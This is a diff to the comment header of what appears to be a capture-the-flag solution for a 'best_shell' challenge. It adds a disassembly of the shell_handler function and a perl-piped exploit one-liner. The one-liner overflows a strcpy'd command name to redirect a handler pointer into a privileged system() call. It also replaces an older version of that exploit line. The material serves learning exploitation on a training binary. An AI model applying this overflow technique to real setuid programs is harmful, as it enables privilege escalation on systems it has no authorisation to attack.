@@ -1,7 +1,34 @@
 /*
 ** Solution
-** cat <(perl -e 'print "rename add AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB" . "mult" . "A"x28 ."\xd7\x89\x04\x08\x0a\x00"') - | ./best_shell 
-** "mult"A"(x 28 times)\xd7\x89\x04\x08" is the name of the former mult command
+**080489c6 <shell_handler>:
+**  80489c6:       55                      push   ebp
+**  80489c7:       89 e5                   mov    ebp,esp
+**  80489c9:       83 ec 28                sub    esp,0x28
+**  80489cc:       0f b6 05 85 b0 04 08    movzx  eax,BYTE PTR ds:0x804b085
+**  80489d3:       84 c0                   test   al,al
+**  80489d5:       74 2f                   je     8048a06 <shell_handler+0x40>
+**  80489d7:       e8 24 fc ff ff          call   8048600 <getegid@plt>         # HERE ! #
+**  80489dc:       89 45 f4                mov    DWORD PTR [ebp-0xc],eax
+**  80489df:       8b 45 f4                mov    eax,DWORD PTR [ebp-0xc]
+**  80489e2:       89 44 24 08             mov    DWORD PTR [esp+0x8],eax
+**  80489e6:       8b 45 f4                mov    eax,DWORD PTR [ebp-0xc]
+**  80489e9:       89 44 24 04             mov    DWORD PTR [esp+0x4],eax
+**  80489ed:       8b 45 f4                mov    eax,DWORD PTR [ebp-0xc]
+**  80489f0:       89 04 24                mov    DWORD PTR [esp],eax
+**  80489f3:       e8 a8 fc ff ff          call   80486a0 <setresgid@plt>
+**  80489f8:       c7 04 24 a3 8e 04 08    mov    DWORD PTR [esp],0x8048ea3
+**  80489ff:       e8 2c fc ff ff          call   8048630 <system@plt>
+**  8048a04:       eb 0c                   jmp    8048a12 <shell_handler+0x4c>
+**  8048a06:       c7 04 24 ab 8e 04 08    mov    DWORD PTR [esp],0x8048eab
+**  8048a0d:       e8 0e fc ff ff          call   8048620 <puts@plt>
+**  8048a12:       c9                      leave
+**  8048a13:       c3                      ret
+**
+*/
+
+/*
+** pico4180@shell:/home/best_shell$ (perl -e 'print "rename add AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB" . "mult" . "A"x28 ."\xd7\x89\x04\x08\x00\n"'; perl -e 'print "mult" . "A"x28 . "\xd7\x89\x04\x08" . "\n"'; cat)|./best_shell
+** "mult"A"(x 28 times)\xd7\x89\x04\x08" is the name of the new mult command
 ** since strcpy stops at the first NULL characters, we can't do "mult\x00" otherwise the handler won't be replaced by our addr.
 */
 
